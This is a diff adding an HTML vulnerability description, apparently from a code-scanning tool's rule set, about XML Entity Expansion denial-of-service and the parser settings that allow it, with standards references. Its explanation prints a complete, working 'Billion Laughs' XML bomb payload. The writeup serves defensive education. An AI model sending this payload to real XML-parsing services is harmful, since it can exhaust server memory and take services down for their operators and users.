@@ -1,0 +1,22 @@
+
+							<h2>ABSTRACT</h2>
+							<p>
+							  Using XML parsers configured to not prevent nor limit document type definition (DTD) entity resolution can expose the parser to an XML Entity Expansion injection attack
+							</p>
+							<h2>EXPLANATION</h2>
+							<p>
+							  XML Entity Expansion injection attacks are DoS attacks that benefit from valid and well-formed XML blocks that expand exponentially until they exhaust the server allocated resources. XML allows to define custom entities which act as string substitution macros. By nesting recurrent entity resolutions, an attacker can easily crash the server resources. <br>  <br>The following XML document shows an example of an XML Bomb.<br><pre><br>&lt;?xml version="1.0"?&gt;<br>&lt;!DOCTYPE lolz [<br>  &lt;!ENTITY lol "lol"&gt;<br>  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;<br>  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<br>  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;<br>  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;<br>  &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;<br>  &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;<br>  &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;<br>  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;<br>]&gt;<br>&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;<br></pre><br><br>This test could crash the server by expanding the small XML document into more than 3GB in memory.<br>
+							</p>
+							 								<h2>REFERENCES</h2>
+																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
+																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
+																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
+																									   <p>[4] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 776</em> <br></p>
+																									   <p>[5] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Denial of Service</em> <br></p>
+																									   <p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
+																									   <p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection</em> <br></p>
+																									   <p>[8]  <em>Testing for XML Injection (OWASP-DV-008)</em> OWASP<br></p>
+																									   <p>[9]  <em>XML Denial of Service Attacks and Defenses</em> MSDN Magazine<br></p>
+																									   <p>[10]  <em>XML External Entities</em> The Web Application Security Consortium<br></p>
+																									   <p>[11]  <em>XML External Entity (XXE) Processing</em> OWASP<br></p>
+																														
